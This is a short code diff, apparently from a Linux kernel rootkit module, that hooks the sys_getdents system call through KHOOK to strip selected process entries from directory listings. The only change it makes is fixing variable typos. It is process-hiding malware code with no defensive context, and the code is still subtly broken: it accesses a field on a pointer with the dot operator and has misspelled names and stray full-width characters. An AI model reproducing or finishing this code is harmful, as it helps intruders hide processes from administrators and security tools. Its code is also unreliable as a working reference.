@@ -204,19 +204,18 @@ KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsign
 static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
 	long value=0;
 	int temp,len;
-	struct linux_dirent64 *mydir = NULL;
 	value=KHOOK_ORIGIN(fd, dirp, count);
 	temp=value;
 	while(temp>0){
 		len=dirp.d_relen;
-		temp=tlen-len;
+		temp=temp-len;
 		printk("%s\n",dirp->d_name);
 		if(get_process(myatoi(dirp->d_name))){
 			printk("find process\n");
 			memmove(dirp, (char *) dirp + dirp->d_reclen, temp);
 			value=value-len;
 		}
-		if(tlen)
+		if(temp)
 　　	dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
 　　}
 　　return value;
